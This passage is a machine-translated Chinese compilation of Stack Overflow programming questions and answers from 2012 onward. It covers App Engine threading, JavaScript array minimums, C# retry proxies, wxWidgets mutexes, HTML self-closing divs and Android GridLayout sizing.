不再是真的。有关更多详细信息，请参阅此处有关线程的部分： [https ://developers.google.com/appengine/docs/java/runtime#The_Sandbox](https://developers.google.com/appengine/docs/java/runtime#The_Sandbox)

因此，总而言之，App Engine 在以下几个方面是多线程的：
- 请求可以由单个实例同时处理，每个请求使用一个线程
- 单个请求可以显式启动其他线程

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-27T10:50:39.717

如[文档中所述](https://developers.google.com/appengine/docs/java/config/appconfig#Using_Concurrent_Requests)，您可以在 Java 应用程序上启用并发请求，在这种情况下将产生多个线程，每个线程独立处理请求。

实例不会从已经运行的实例中克隆出来，也不会以任何方式同步 - 您应该以不依赖于特定可变实例状态的方式编写代码。

# knockout.js - 在同一页面上使用 ICanHaz.js 和 knockout.js

> ID：10347818
> 
> 赞同：0
> 
> 时间：2012-04-27T09:04:38.690
> 
> 标签：knockout.js, icanhaz.js

我有一个应用程序，其中使用 knockout.js 来提供大多数站点功能，但我想将 ICanHaz.js 用于特定功能。这两个框架都使用`<script type='text/html'... />`部分来定义模板。然而，ICanHaz 会处理模板（以创建 javascript 函数来呈现模板），然后将它们从 dom 中删除，这样它们就不能用于在页面生命周期的后期绑定到敲除。

任何人都知道让这两个框架很好地发挥作用的方法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T11:06:35.337

Knockout 并不关心 script 标签上的类型，所以你可以真正将它设为`text/javascript`. 如果 ICanHaz.js 正在寻找`text/html`，那么您可以`text/ko`在您的 Knockout 模板上使用。

# php - 将用户输入的字符串与mysql中的curdate进行比较

> ID：10347826
> 
> 赞同：0
> 
> 时间：2012-04-27T09:05:26.653
> 
> 标签：php, mysql, date

我正在开发一个强烈依赖正确日期的 php/mysql 应用程序。为了确保插入数据库的日期始终正确，并且由于 php/mysql 日期函数依赖于系统时钟，我决定要求用户在日期表单字段中输入当前日期，然后将其与当前日期进行比较在将任何数据插入数据库之前使用 CURDATE() 数据库。

我不知道这是否是正确的方法，还是他们确保日期完整性的更好解决方案？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T09:21:04.410

（*升级到答案*）

人们通常会依赖系统时钟是正确的；它比用户输入更受自己的控制，用户输入可能是故意或意外不正确的。

我建议`CURDATE()`在您的声明中使用作为值`INSERT`，并采取措施，例如运行[网络时间协议](http://en.wikipedia.org/wiki/Network_Time_Protocol)客户端以保持系统时钟正确。大多数现代操作系统不仅默认包含此类软件，而且它们通常经过配置并且开箱即用。

如果您的系统是独立的并且无法从网络更新其时间，您可以考虑以下任意组合： 从另一个来源接收时间信号（例如通过无线电，如[NPL 信号](http://en.wikipedia.org/wiki/Time_from_NPL)）；定期验证系统时钟（尤其是在启动时）；监控 CMOS 电池并确保及时更换；或使用可充电电池。

# objective-c - 从子视图控制器重置根视图控制器中的对象

> ID：10347828
> 
> 赞同：0
> 
> 时间：2012-04-27T09:05:33.890
> 
> 标签：objective-c, memory-management

我的应用有 4 个视图控制器。第一个 VC 实例化一个对象并拥有它的“强”所有权。每个 VC 都将其传递给它们各自的子 VC，它们与该对象的关系都很弱。当最后一个 VC 完成并执行 popToRootViewController 时，我希望最后一个 VC 重置此对象，以便第一个 VC 可以使用新的空对象，我该如何实现？我尝试将对象设置为 nil 并为该对象分配一个新对象，但遗憾的是，这不起作用。有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T09:08:55.060

使用委托。将第二个 VC（即根的第一个子级）设置为具有一个名为委托（或父级等）的属性，该属性设置为指向父级。与其通过弱引用来调整它，不如告诉父级释放它，然后弹出。

或者，如果您不希望每个人都必须知道父级，您可以通过 直接访问顶视图控制器`UIApplicationDelegate`，假设它具有 VC 的属性。实际上，您可以在此处放置对共享对象的引用，然后直接将其重置。

# iphone - iOS UIView 块动画停止实际动画

> ID：10347830
> 
> 赞同：4
> 
> 时间：2012-04-27T09:05:36.400
> 
> 标签：iphone, uiviewanimation

我在使用基于块的 UIView 动画时遇到了一个奇怪的问题。我的应用程序在滚动视图中包含各种图像，并且在设备上使用该应用程序一段时间后，UIView 动画块中的所有动画（如下面的）停止动画。动画被处理（在下面的示例代码中，pageView 确实移动了），但这种变化不是动画的，而是立即发生的。

```
[UIView animateWithDuration:0.5 animations:^
{ 
     self.pageView.center = CGPointMake(self.view.frame.size.width/2, 704.0/2);
     self.pageView.transform = CGAffineTransformIdentity;
} 
completion:^(BOOL finished)
{
     NSLog(@"complete");
}]; 
```

有没有其他人经历过类似的行为？我在 5.1 上使用 iPad，想知道它是否可以降到 iOS 版本？

谢谢，

迈克尔

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-26T07:10:42.607

检查您的内存使用情况。我看到的和你一样——最终所有的动画都停止了工作。动画甚至没有为我运行，完成块也没有触发。

我发现我持有一些不再可见的 UIImageViews，因为我想稍后重新显示它们。删除它们并释放 UIImage 使问题消失。我现在需要弄清楚我将如何取回图像，但至少动画按预期工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-27T11:43:54.777

尝试使用一些动画选项，看看是否有帮助？

例如，在这里我让用户交互并让视图在动画期间重绘自己：

```
[UIView animateWithDuration:0.5
                      delay:0
                    options: UIViewAnimationOptionAllowUserInteraction | UIViewAnimationOptionAllowAnimatedContent   
                 animations:^ {
                    self.pageView.center = CGPointMake(self.view.frame.size.width/2, 704.0/2);
                    self.pageView.transform = CGAffineTransformIdentity;
               } completion:^ (BOOL finished) { 
               } ]; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-27T11:10:20.110

当您使用变换时，如果单独使用动画，它们可能会产生非常不可预测的行为。为避免这种情况，您应该通过将所有变换连接到`CGAffineTransformConcat`单个变换并为该单个变换设置动画。

# c# - 动态重试代理

> ID：10347831
> 
> 赞同：1
> 
> 时间：2012-04-27T09:05:39.890
> 
> 标签：c#, .net, castle-dynamicproxy, dynamic-proxy

考虑以下，它的工作原理：

```
public interface IService
{
    void DoSomething(object arg);
    void DoSomethingElse(object arg, bool anotherArg);
    bool AndDoYetMoreStuff(object arg, object[] moreArgs);
}

public class Service : IService
{
    public void DoSomething(object arg){}

    public void DoSomethingElse(object arg, bool anotherArg){}

    public bool AndDoYetMoreStuff(object arg, object[] moreArgs)
    {
        return true;
    }
}

public class ServiceRetryProxy : IService
{
    const int retryLimit = 3;
    private readonly IService _service;

    public ServiceRetryProxy(IService service)
    {
        _service = service;
    }

    private void RetryOnException(Action<IService> ctx)
    {
        ReconnectOnException(service =>
        {
            ctx(service);
            return new object();
        });
    }

    private T RetryOnException<T>(Func<IService, T> ctx)
    {
        var counter = 0;
        Exception lastException = null;
        while (counter < retryLimit)
        {
            try
            {
                return ctx(_service);
            }
            catch (Exception ex)
            {
                lastException = ex;
                counter++;
            }
        }

        throw lastException;
    }

    public void DoSomething(object arg)
    {
        ReconnectOnException(x => x.DoSomething(arg));
    }

    public void DoSomethingElse(object arg, bool anotherArg)
    {
        ReconnectOnException(x => x.DoSomethingElse(arg, anotherArg));
    }

    public bool AndDoYetMoreStuff(object arg, object[] moreArgs)
    {
        return ReconnectOnException(x => x.AndDoYetMoreStuff(arg, moreArgs));
    }
} 
```

这样做的问题是我必须为接口的每个方法编写一个代理方法。我想要一个更“动态”的解决方案，以便我可以将 RetryOnException（或任何其他逻辑）应用于任何给定接口上的每个方法。我目前正在查看 Castle DynamicProxy，但如果有其他选项怎么办？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T10:01:49.410

Castle 动态代理当然是一种选择。

但我个人会选择 postsharp： [http ://www.sharpcrafters.com/](http://www.sharpcrafters.com/)

我已经将它用于类似的场景。我创建了 RetryOneexceptionAspect，您可以在其中指定异常类型、重试次数并将其应用于任何方法：

```
[Serializable]
public class RetryOnExceptionAspect : MethodInterceptionAspect
{
    private readonly int maxRetries;

    private readonly Type exceptionType;

    public RetryOnExceptionAspect(int maxRetries, Type exceptionType)
    {
        this.maxRetries = maxRetries;
        this.exceptionType = exceptionType;
    }

    public override void OnInvoke(MethodInterceptionArgs args)
    {
        for (int i = 0; i < maxRetries + 1; i++)
        {
            try
            {
                args.Proceed();
            }
            catch (Exception e)
            {
                if (e.GetType() == exceptionType && i < maxRetries)
                {
                    continue;
                }

                throw;
            }

            break;
        }
    }
} 
```

用法如：

```
public class Service : IService
{
    [RetryOnExceptionAspect(5, typeof(TimeoutException)]
    public void DoSomething()
    {
    }
} 
```

# javascript - 运行重复计数后如何在数组中找到重复值的索引？

> ID：10347832
> 
> 赞同：1
> 
> 时间：2012-04-27T09:05:50.217
> 
> 标签：javascript, jquery

我知道有人问过与此类似的问题，但我已经查看了这些问题，并且对于 a）它们是如何工作的，以及 b）我如何调整它们以适应我的目的，我感到非常困惑。因此，我开始了一个新问题。

我有一个只有 4 个索引的数组，每个索引都有一个数字。我的目标是找到该数组中的最小值并返回该最小值的索引。这一直不是问题...

当最低值在多个索引中重复时，就会出现问题。

在这种情况下，我希望能够首先在数组上运行“计数”以找出最小值是否重复，然后如果计数大于 1，则执行以下操作：查找重复值的索引, 最后我需要取这些指数的值并在找到它们之间的最小值之前进行进一步的计算。

例子：

```
 array[ 12.44 , 10.33 , 17.45 , 10.33]
    //First I need a count to find the number of times the lowest value (10.33) occurs
    //Then I would like a function to return either a string containing 1,3 to 
    //represent the indices, or an array[ 1 , 3 
```

如果这个问题已经得到回答，我再次道歉，但请你解释一下答案，因为我反复尝试理解他以前的答案并且无法取得进展。

为什么使用js在数组中查找重复值这么复杂？

提前感谢您的帮助和时间！

约翰

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T09:20:52.647

用纯 JS 这种方式怎么样？

```
var myArr = [12.44 , 10.33 , 17.45 , 10.33];  //Your array    
var lowest = Math.min.apply(Math, myArr);     //Find the lowest number
var count = 0;                                //Set a count variable
var indexes = [];              //New array to store indexes of lowest number

for(var i=0; i<myArr.length;i++) //Loop over your array
{
    if(myArr[i] == lowest) //If the value is equal to the lowest number
    {
       indexes.push(i); //Push the index to your index array
       count++;         //Increment your counter
    }
}
alert(count);           //2
alert(indexes);         //1, 3 
```

和一个工作的 jsFiddle[这里](http://jsfiddle.net/Qhbzp/2/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-27T09:11:42.323

您可以创建一个过滤器，过滤掉所有重复项，然后在临时数组上运行一些魔法以获得所需的数字。例如

```
var arr      = [ 12.44 , 10.33 , 17.45 , 10.33],
    filtered = [ ],
    lowest;

arr.forEach(function( value ) {
    if( filtered.indexOf( value ) === -1 )
        filtered.push( value );
});

lowest = Math.min.apply( null, filtered );  // 10.33
arr.indexOf( lowest ); // 1 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-27T09:13:20.127

```
var arr = [12.44, 10.33, 17.45, 10.33],
    lowest = Math.min.apply(Math, arr), //.. 10.33
    index = $.map(arr, function(o,i) { if (o === lowest) return i; }), //.. [1,3]
    numOfTimes = index.length; //.. 2 
```

**解释：**

`Math.min`是一个函数。您可以调用任何函数并使用`function.call(context, param1, param2, paramEtc...)`或更改该函数的上下文`function.apply(context, param[])`。

`Math.min`不允许我们通过调用传入数组`Math.min(arr)`，因为它需要一个逗号分隔的参数列表；这就是为什么我们有这种有趣的语法`Math.min.apply(Math, arr)`

`$.map()`只是一个方便的迭代器，您可以使用任何方法来获取索引数组

# c++ - c++中使用wxwidgets的互斥锁

> ID：10347838
> 
> 赞同：1
> 
> 时间：2012-04-27T09:06:14.520
> 
> 标签：c++, wxwidgets, mutex

我正在阅读以下关于互斥保护的示例：-

访问[http://docs.wxwidgets.org/2.8/wx_wxmutex.html#wxmutex](http://docs.wxwidgets.org/2.8/wx_wxmutex.html#wxmutex)

这里有一个注释代码：-

```
 //we store some numbers in this global array which is presumably used by
 //several threads simultaneously 
```

运行多个线程是否意味着运行同一线程的不同副本（如果是 this，那么请帮我这样做）或具有不同功能但可以访问关键部分的函数。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T09:47:59.400

该示例假设您将生成线程 MyThread 的多个实例，这将改变变量：

```
wxArrayInt s_data; 
```

由于多个线程访问相同的数据，因此您需要处理同步，例如本例中的互斥锁。

```
s_mutexProtectingTheGlobalList->Lock();

s_data.Add(num);

s_mutexProtectingTheGlobalList->Unlock(); 
```

这样，只有 1 个线程能够同时访问数据，并且可以防止多线程问题。

如果你不这样做，线程可能会在相互中断时使用过时的数据，这是一个基本示例：

```
int a = 0;

void foo()
{
int b = a;
 b += 1;
 a = b;
} 
```

如果有 2 个线程在同一数据上使用此函数，则可能会发生以下情况：

```
thread 1:
   reads a into b  (a = 0, b = 0)
   adds 1 to local b (a = 0, b = 1)
   end of timeslice, switches to thread 2
thread 2:
   reads a into b (a = 0, b = 0)
   adds 1 to local b (a = 0, b = 1)
   writes b back into a (a = 1, b = 1)
   end of timeslice/operation
thread 1:
   writes b back into a (a = 1, b = 1) 
```

所以因为 2 个线程拥有数据的副本，如果线程 2 过时，它们将相互覆盖，所以不是 2，而是 1 个线程 1

# html - 想知道为什么自关闭 div 不起作用？

> ID：10347844
> 
> 赞同：0
> 
> 时间：2012-04-27T09:06:41.103
> 
> 标签：html, css

> **可能的重复：**
> [XHTML 中所有有效的自关闭标签（由主要浏览器实现）是什么？](https://stackoverflow.com/questions/97522/what-are-all-the-valid-self-closing-tags-in-xhtml-as-implemented-by-the-major-b)
> [（非无效）自闭合标签在 HTML5 中有效吗？](https://stackoverflow.com/questions/3558119/are-non-void-self-closing-tags-valid-in-html5)
> [为什么浏览器认为这个 <div/> 标签没有立即结束？](https://stackoverflow.com/questions/5455768/why-do-browsers-think-this-div-tag-isnt-immediately-ended)

有人可以解释为什么会这样吗？

```
.lineBreak10
{
    height: 10px;
} 
```

`<div class="lineBreak10"/>` --> 不起作用

`<div class="lineBreak10"></div>`--> 有效

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-27T09:08:36.557

这不是 div 应该如何工作的。它们是块级元素，您应该能够将东西放入其中。

此外，您似乎正在尝试使用 div 在两个元素之间创建视觉（风格）空间。这不是 HTML 的用途。这就是 CSS 的用途。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-04-27T09:10:27.770

因为 HTML 不是 XML。

虽然 HTML 看起来很像 XML，但它实际上是一个完全独立的东西，不受相同规则的约束。

如果您使用 XHTML，将其作为 XML 提供给 Web 浏览器，则自关闭元素不起作用是一个错误，但如果您将文档作为 HTML 提供，那么所有与 XML 相关的规则和 HTML 的相似性都会消失。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-27T09:08:31.367

好吧，虽然这**是**有效的**XHTML**，但它**不是**有效的**HTML 4.***。

就那么简单...

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-27T09:09:24.020

因为是标签容器，即使是javascript也可以填写

--> [http://www.w3.org/TR/html401/struct/global.html#h-7.5.4](http://www.w3.org/TR/html401/struct/global.html#h-7.5.4)

# android - 如何使 GridLayout 适合屏幕大小

> ID：10347846
> 
> 赞同：37
> 
> 时间：2012-04-27T09:06:42.343
> 
> 标签：android, widget

`GridLayout`API文档很难学习......
有没有人可以教我如何设置孩子的`View`“体重”之类的东西`LinearLayout`？

现在看起来好像都放在了左侧，
我尝试了很多次，仍然无法使其每个都像屏幕的一半宽度。

编辑：我不知道当孩子们都在做什么时我能做什么`wrap_content`......即使我想设置一些特定尺寸的图像，这个类也可以帮助我制作`ImageView` `wrap_content`......它无法正常运行，我是否错过了某些设置？！？

* * *

## 回答 #1

> 赞同：65
> 
> 时间：2012-04-27T09:28:37.570

**注意**：随着 Android 'Lollipop' 5 的引入，水平线下方的信息不再准确，`GridLayout` *因为*从 API 级别 21 开始适应权重原则。

引用自[Javadoc](http://developer.android.com/reference/android/widget/GridLayout.html)：

> **多余空间分布**
> 
> 从 API 21 开始，GridLayout 对多余空间的分配符合权重原则。如果未指定权重，则遵循先前的约定，并且如果它们的视图在其组内指定某种形式的对齐方式，则将列和行视为灵活。因此，视图的灵活性受其对齐方式的影响，而对齐方式通常通过设置子布局参数的重力属性来定义。如果沿给定轴定义了权重或对齐，则该组件在该方向上被视为灵活。如果没有设置权重或对齐方式，则假定组件是不灵活的。
> 
> 同一行或列组中的多个组件被视为并行操作。只有当其中的所有组件都是灵活的时，这样的组才是灵活的。相反，位于公共边界两侧的行组和列组被视为串联。如果其中一个元素是灵活的，则由这两个元素组成的复合组是灵活的。
> 
> 要使柱子伸展，请确保其中的所有组件都定义了重量或重力。要防止柱子拉伸，请确保柱子中的一个组件未定义重量或重力。
> 
> 当灵活性原则不能完全消除歧义时，GridLayout 的算法偏向于更靠近其右边缘和下边缘的行和列。更准确地说，GridLayout 将其每个布局参数视为一组变量中的约束，这些变量定义了沿给定轴的网格线。在布局期间，GridLayout 对约束进行求解，以便将所有变量小于或等于任何其他有效解中对应值的约束返回唯一解。

还值得注意的是，它[`android.support.v7.widget.GridLayout`](http://developer.android.com/reference/android/support/v7/widget/GridLayout.html)包含相同的信息。不幸的是，它没有提到它引入了哪个版本的支持库，但[添加该功能的提交](https://github.com/android/platform_frameworks_support/commit/b1dbd65b4e8ce2c889381214d0bc44aff8dfe616)可以追溯到 2014 年 7 月。2014 年 11 月，[重量计算的改进和一个错误得到了修复](https://github.com/android/platform_frameworks_support/commit/5f355e700d63f67b1641f023d95e18c69c596ecb)。

为了安全起见，请确保导入最新版本的 gridlayout-v7 库。

* * *

正如您所描述的那样，“权重”的原理不存在于`GridLayout`. [文档](http://developer.android.com/reference/android/widget/GridLayout.html)中明确提到了此限制；摘录如下。话虽如此，有一些可能性可以使用“重力”来分配多余的空间。我建议您通读链接的文档。

> **限制**
> 
> GridLayout 不提供对 weight 原则的支持，正如*weight*中定义的那样。通常，因此不可能配置 GridLayout 以在多行或多列之间以非平凡的比例分配多余的空间。尽管如此，一些常见的用例仍可按如下方式进行调整。在单元组中的组件周围放置等量的空间；使用 CENTER 对齐（或重力）。用于完全控制行或列中多余的空间分布；使用 LinearLayout 子视图将组件保存在关联的单元组中。当使用这些技术中的任何一种时，请记住，单元组可能被定义为重叠。

有关示例和一些实用提示，请查看[去年介绍`GridLayout`小部件](http://android-developers.blogspot.co.nz/2011/11/new-layout-widgets-space-and-gridlayout.html)的博客文章。

* * *

**编辑：**我认为没有一种基于 xml 的方法可以像在 Google Play 应用程序中那样将图块缩放为“正方形”或“矩形”两倍于这些正方形的长度。但是，如果您以编程方式构建布局，这当然是可能的。您真正需要知道的只是设备的屏幕尺寸。

低于（非常！）Google Play 应用程序中平铺布局的快速近似值。

```
Point size = new Point();
getWindowManager().getDefaultDisplay().getSize(size);
int screenWidth = size.x;
int screenHeight = size.y;
int halfScreenWidth = (int)(screenWidth *0.5);
int quarterScreenWidth = (int)(halfScreenWidth * 0.5);

Spec row1 = GridLayout.spec(0, 2);
Spec row2 = GridLayout.spec(2);
Spec row3 = GridLayout.spec(3);
Spec row4 = GridLayout.spec(4, 2);

Spec col0 = GridLayout.spec(0);
Spec col1 = GridLayout.spec(1); 
Spec colspan2 = GridLayout.spec(0, 2);

GridLayout gridLayout = new GridLayout(this);
gridLayout.setColumnCount(2);
gridLayout.setRowCount(15);

TextView twoByTwo1 = new TextView(this);
GridLayout.LayoutParams first = new GridLayout.LayoutParams(row1, colspan2);
first.width = screenWidth;
first.height = quarterScreenWidth * 2;
twoByTwo1.setLayoutParams(first);
twoByTwo1.setGravity(Gravity.CENTER);
twoByTwo1.setBackgroundColor(Color.RED);
twoByTwo1.setText("TOP");
twoByTwo1.setTextAppearance(this, android.R.style.TextAppearance_Large);
gridLayout.addView(twoByTwo1, first);

TextView twoByOne1 = new TextView(this);
GridLayout.LayoutParams second = new GridLayout.LayoutParams(row2, col0);
second.width = halfScreenWidth;
second.height = quarterScreenWidth;
twoByOne1.setLayoutParams(second);
twoByOne1.setBackgroundColor(Color.BLUE);
twoByOne1.setText("Staff Choices");
twoByOne1.setTextAppearance(this, android.R.style.TextAppearance_Large);
gridLayout.addView(twoByOne1, second);

TextView twoByOne2 = new TextView(this);
GridLayout.LayoutParams third = new GridLayout.LayoutParams(row2, col1);
third.width = halfScreenWidth;
third.height = quarterScreenWidth;
twoByOne2.setLayoutParams(third);
twoByOne2.setBackgroundColor(Color.GREEN);
twoByOne2.setText("Games");
twoByOne2.setTextAppearance(this, android.R.style.TextAppearance_Large);
gridLayout.addView(twoByOne2, third);

TextView twoByOne3 = new TextView(this);
GridLayout.LayoutParams fourth = new GridLayout.LayoutParams(row3, col0);
fourth.width = halfScreenWidth;
fourth.height = quarterScreenWidth;
twoByOne3.setLayoutParams(fourth);
twoByOne3.setBackgroundColor(Color.YELLOW);
twoByOne3.setText("Editor's Choices");
twoByOne3.setTextAppearance(this, android.R.style.TextAppearance_Large_Inverse);
gridLayout.addView(twoByOne3, fourth);

TextView twoByOne4 = new TextView(this);
GridLayout.LayoutParams fifth = new GridLayout.LayoutParams(row3, col1);
fifth.width = halfScreenWidth;
fifth.height = quarterScreenWidth;
twoByOne4.setLayoutParams(fifth);
twoByOne4.setBackgroundColor(Color.MAGENTA);
twoByOne4.setText("Something Else");
twoByOne4.setTextAppearance(this, android.R.style.TextAppearance_Large);
gridLayout.addView(twoByOne4, fifth);

TextView twoByTwo2 = new TextView(this);
GridLayout.LayoutParams sixth = new GridLayout.LayoutParams(row4, colspan2);
sixth.width = screenWidth;
sixth.height = quarterScreenWidth * 2;
twoByTwo2.setLayoutParams(sixth);
twoByTwo2.setGravity(Gravity.CENTER);
twoByTwo2.setBackgroundColor(Color.WHITE);
twoByTwo2.setText("BOTOM");
twoByTwo2.setTextAppearance(this, android.R.style.TextAppearance_Large_Inverse);
gridLayout.addView(twoByTwo2, sixth); 
```

结果看起来有点像这样（在我的 Galaxy Nexus 上）：

![使用 GridLayout 的平铺布局](../Images/e0ebf99963ab8882a0e1fa770328952b.png)

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2014-02-28T02:01:14.007

经过多次尝试，我在这个布局中找到了我想要的东西。即使是带有自动安装的 ImageViews 的间隔线性布局，并保持纵横比。适用于具有任何屏幕和图像分辨率的横向和纵向。

![连结 7](../Images/d126636d8df83d48b1b25476d66ee1a4.png) ![连结 5](../Images/6e1936fae104cb9cfa8eed1bf7b0cfad.png) ![连结 10](../Images/3920d4a24fd634e52a7f4fc5227090f4.png)

```
<FrameLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:background="#ffcc5d00" >

    <LinearLayout
        android:layout_width="fill_parent"
        android:layout_height="fill_parent"
        android:orientation="vertical">

        <LinearLayout
            android:orientation="vertical"
            android:layout_width="fill_parent"
            android:layout_height="fill_parent">

            <LinearLayout
                android:orientation="horizontal"
                android:layout_width="fill_parent"
                android:layout_weight="1"
                android:layout_height="wrap_content">

                <LinearLayout
                    android:orientation="vertical"
                    android:layout_width="0dp"
                    android:layout_weight="1"
                    android:padding="10dip"
                    android:layout_height="fill_parent">

                    <ImageView
                        android:id="@+id/image1"
                        android:layout_height="fill_parent"
                        android:adjustViewBounds="true"
                        android:scaleType="fitCenter"
                        android:src="@drawable/stackoverflow"
                        android:layout_width="fill_parent"
                        android:layout_gravity="center" />
                </LinearLayout>

                <LinearLayout
                    android:orientation="vertical"
                    android:layout_width="0dp"
                    android:layout_weight="1"
                    android:padding="10dip"
                    android:layout_height="fill_parent">

                    <ImageView
                        android:id="@+id/image2"
                        android:layout_height="fill_parent"
                        android:adjustViewBounds="true"
                        android:scaleType="fitCenter"
                        android:src="@drawable/stackoverflow"
                        android:layout_width="fill_parent"
                        android:layout_gravity="center" />
                </LinearLayout>
            </LinearLayout>

            <LinearLayout
                android:orientation="horizontal"
                android:layout_weight="1"
                android:layout_width="fill_parent"
                android:layout_height="wrap_content">

                <LinearLayout
                    android:orientation="vertical"
                    android:layout_width="0dp"
                    android:layout_weight="1"
                    android:padding="10dip"
                    android:layout_height="fill_parent">

                    <ImageView
                        android:id="@+id/image3"
                        android:layout_height="fill_parent"
                        android:adjustViewBounds="true"
                        android:scaleType="fitCenter"
                        android:src="@drawable/stackoverflow"
                        android:layout_width="fill_parent"
                        android:layout_gravity="center" />
                </LinearLayout>

                <LinearLayout
                    android:orientation="vertical"
                    android:layout_width="0dp"
                    android:layout_weight="1"
                    android:padding="10dip"
                    android:layout_height="fill_parent">

                    <ImageView
                        android:id="@+id/image4"
                        android:layout_height="fill_parent"
                        android:adjustViewBounds="true"
                        android:scaleType="fitCenter"
                        android:src="@drawable/stackoverflow"
                        android:layout_width="fill_parent"
                        android:layout_gravity="center" />
                </LinearLayout>
            </LinearLayout>
        </LinearLayout>
    </LinearLayout>
</FrameLayout> 
```

* * *

## 回答 #3

> 赞同：10
> 
> 时间：2015-12-20T13:02:13.650

从**API 21**开始，权重的概念被添加到**GridLayout**中。

要支持较旧的 android 设备，您可以使用**v7 支持库中的 GridLayout。**

```
compile 'com.android.support:gridlayout-v7:22.2.1' 
```

以下 XML 提供了一个示例，说明如何使用权重填充屏幕宽度。

```
<?xml version="1.0" encoding="utf-8"?>
<android.support.v7.widget.GridLayout
    xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:grid="http://schemas.android.com/apk/res-auto"

    android:id="@+id/choice_grid"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    android:layout_centerHorizontal="true"
    android:padding="4dp"

    grid:alignmentMode="alignBounds"
    grid:columnCount="2"
    grid:rowOrderPreserved="false"
    grid:useDefaultMargins="true">

    <TextView
        android:layout_width="0dp"
        android:layout_height="100dp"
        grid:layout_columnWeight="1"
        grid:layout_gravity="fill_horizontal"
        android:gravity="center"
        android:background="#FF33B5E5"
        android:text="Tile1" />

    <TextView
        android:layout_width="0dp"
        android:layout_height="100dp"
        grid:layout_columnWeight="1"
        grid:layout_gravity="fill_horizontal"
        android:gravity="center"
        android:background="#FF33B5E5"
        android:text="Tile2" />

    <TextView
        android:layout_width="0dp"
        android:layout_height="100dp"
        grid:layout_columnWeight="1"
        grid:layout_gravity="fill_horizontal"
        android:gravity="center"
        android:background="#FF33B5E5"
        android:text="Tile3" />

    <TextView
        android:layout_width="0dp"
        android:layout_height="100dp"
        grid:layout_columnWeight="1"
        grid:layout_gravity="fill_horizontal"
        android:gravity="center"
        android:background="#FF33B5E5"
        android:text="Tile4" />

</android.support.v7.widget.GridLayout> 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-12-21T16:36:12.867

如果您使用片段，您可以准备 XML 布局，然后以编程方式对关键元素进行分层

```
int thirdScreenWidth = (int)(screenWidth *0.33);

View view = inflater.inflate(R.layout.fragment_second, null);
View _container = view.findViewById(R.id.rim1container);
_container.getLayoutParams().width = thirdScreenWidth * 2;

_container = view.findViewById(R.id.rim2container);
_container.getLayoutParams().width = screenWidth - thirdScreenWidth * 2;

_container = view.findViewById(R.id.rim3container);
_container.getLayoutParams().width = screenWidth - thirdScreenWidth * 2; 
```

此布局适用于 3 个相等的列。图片中的第一个元素取 2x2 结果 ![在此处输入图像描述](../Images/7fbe8955661152b119cd705b121e5473.png)

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2015-02-18T08:48:56.003

只需快速跟进并注意，现在可以在 GridLayout 中使用带加权间距的支持库来实现您想要的，请参阅：

> 从 API 21 开始，GridLayout 对多余空间的分配符合权重原则。如果未指定权重，则遵循先前的约定，并且如果它们的视图在其组内指定某种形式的对齐方式，则将列和行视为灵活。因此，视图的灵活性受其对齐方式的影响，而对齐方式通常通过设置子布局参数的重力属性来定义。如果沿给定轴定义了权重或对齐，则该组件在该方向上被视为灵活。如果没有设置权重或对齐方式，则假定组件是不灵活的。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2016-08-03T08:47:45.587

我存档这个使用`LinearLayout`

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout android:layout_width="match_parent"
    android:layout_height="wrap_content"
    android:orientation="vertical"
    xmlns:android="http://schemas.android.com/apk/res/android">

    <LinearLayout
        android:layout_width="fill_parent"
        android:layout_height="wrap_content">
        <TextView
            android:layout_width="fill_parent"
            android:layout_height="wrap_content"
            android:height="166dp"
            android:text="Tile1"
            android:gravity="center"
            android:background="#6f19e5"/>
    </LinearLayout>
    <LinearLayout
        android:layout_width="match_parent"
        android:layout_height="wrap_content">
        <TextView
            android:text="Tile2"
            android:layout_width="0dp"
            android:layout_height="wrap_content"
            android:height="126dp"
            android:gravity="center"
            android:layout_weight=".50"
            android:background="#f1d600"/>

        <TextView
            android:text="Tile3"
            android:layout_width="0dp"
            android:layout_height="wrap_content"
            android:height="126dp"
            android:gravity="center"
            android:layout_weight=".50"
            android:background="#e75548"/>

    </LinearLayout>
    <LinearLayout
        android:layout_width="match_parent"
        android:layout_height="wrap_content">
        <TextView
            android:text="Tile4"
            android:layout_width="0dp"
            android:layout_height="wrap_content"
            android:height="126dp"
            android:gravity="center"
            android:layout_weight=".50"
            android:background="#29d217"/>

        <TextView
            android:text="Tile5"
            android:layout_width="0dp"
            android:layout_height="wrap_content"
            android:height="126dp"
            android:gravity="center"
            android:layout_weight=".50"
            android:background="#e519cb"/>

    </LinearLayout>
    <LinearLayout
        android:layout_width="fill_parent"
        android:layout_height="fill_parent">
        <TextView
            android:layout_width="fill_parent"
            android:layout_height="wrap_content"
            android:height="176dp"
            android:text="Tile6"
            android:gravity="center"
            android:background="#09eadd"/>
    </LinearLayout>
</LinearLayout> 
```

[![这里的模态](../Images/36e2db67bb6c6ed37872f709adb3e7e2.png)](https://i.stack.imgur.com/PdF1W.jpg)

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2017-06-12T19:56:10.200

